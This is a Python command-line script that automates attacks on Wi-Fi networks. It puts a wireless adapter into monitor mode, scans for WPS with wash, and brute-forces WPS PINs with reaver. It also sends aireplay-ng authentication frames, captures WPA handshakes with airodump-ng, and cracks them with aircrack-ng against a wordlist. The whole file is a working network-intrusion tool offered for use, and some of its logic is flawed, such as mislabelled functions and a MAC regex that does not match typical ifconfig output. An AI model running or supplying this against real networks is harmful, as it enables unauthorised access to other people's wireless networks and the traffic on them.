#!/usr/bin/env python

import subprocess
import re


def enable_monitor_mode(interface):
    """Enable monitor mode"""
    print(f'Changing {interface} to monitor mode')
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['iwconfig', interface, 'mode', 'monitor'])
    subprocess.call(['ifconfig', interface, 'up'])


def check_wps(interface):
    """Check for WPS enabled"""
    print(f'Using {interface} to check for WPS')
    subprocess.call(['wash', '--interface', interface])


def capture_handshake(adapter):
    """Capture WPA handshake"""
    print("Capturing handshake")
    wifi_mac = input("[+] Input Wi-Fi MAC address: ")
    result = subprocess.check_output(["ifconfig", adapter], encoding='utf8')
    output = re.search(r"([A-Za-z0-9]+(-[A-Za-z0-9]+)+)", result)
    print(output[0])
    adapter_mac = input("[+] Input adapter MAC: ")
    channel = input("[+] Input channel of Wi-Fi network: ")
    subprocess.call(['reaver', '--bssid', wifi_mac, '--channel', channel, '--interface', adapter, '-vvv', '--no-associate'])
    subprocess.call(['aireplay-ng', '-1', '30', '-a', wifi_mac, '-h', adapter_mac, adapter])


def capture_handshake_process(adapter):
    """Capture WPA handshake process"""
    try:
        print("[+] Press Control + C to stop scan")
        subprocess.call(['airodump-ng', adapter])
    except KeyboardInterrupt:
        wifi_bssid = input("[+] Input BSSID of Wi-Fi: ")
        channel = input("[+] Input Wi-Fi channel: ")
        handshake_file = input("Enter name of handshake file: ")
        subprocess.call(['airodump-ng', '--bssid', wifi_bssid, '--channel', channel, '--write', handshake_file, adapter])


def run_wordlist_attack():
    handshake_file = input("[+] Input Handshake File Name: ")
    wordlist_file = input("[+] Input Wordlist File: ")
    subprocess.call(['aircrack-ng', handshake_file, '-w', wordlist_file])


def get_user_selection():
    print("[+] Which vulnerability do you want to run:")
    print("1. WPS")
    print("2. Wordlist Attack")
    return input("Selection: ")


def main():
    adapter = input("[+] Input Wi-Fi adapter or wireless card: ")
    user_selection = get_user_selection()

    if user_selection == '1':
        try:
            enable_monitor_mode(adapter)
            check_wps(adapter)
        except KeyboardInterrupt:
            pass

        capture_handshake(adapter)
    elif user_selection == '2':
        try:
            capture_handshake_process(adapter)
        except KeyboardInterrupt:
            print("Running Wordlist attack")
            run_wordlist_attack()


if __name__ == "__main__":
    main()
